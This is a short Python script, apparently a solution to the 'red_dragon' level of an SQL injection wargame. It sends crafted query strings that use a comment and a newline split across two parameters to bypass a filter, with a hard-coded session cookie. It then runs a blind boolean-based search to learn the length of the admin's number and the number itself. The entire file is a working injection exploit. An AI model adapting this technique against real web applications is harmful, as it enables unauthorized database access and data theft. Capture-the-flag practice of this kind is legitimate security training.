import requests

url = "https://los.rubiya.kr/chall/red_dragon_b787de2bfe6bc3454e2391c4e7bb5de8.php?"
cookie = {'PHPSESSID':'vhk3v05udt053p3tubi0jcpovl'}
def no_length():
    no_len = "1" 
    while True:
        no_len += "0"
        query = "id='||no<%23&no=%0a{}".format(no_len)
        print(query)
        res = requests.get(url=url+query, cookies=cookie)
        if "Hello admin" in res.text:
            no_len = len(no_len)-1
            print("no Length : " + str(no_len))
            break
    return no_len

def find_no(no_len):
    left = 10**(no_len-1)
    right = 10**(no_len)
    while True:
        mid = (left+right)//2
        query = "id='||no<%23&no=%0a{}".format(mid)
        print(query)
        res = requests.get(url=url+query, cookies=cookie)
        if left > right:
            no = mid
            print("no digit :" +  str(no))
            break
        if "Hello admin" in res.text:
            right = mid - 1
        else:
            left = mid + 1

if __name__ == "__main__":
    no_len = no_length()
    find_no(no_len)
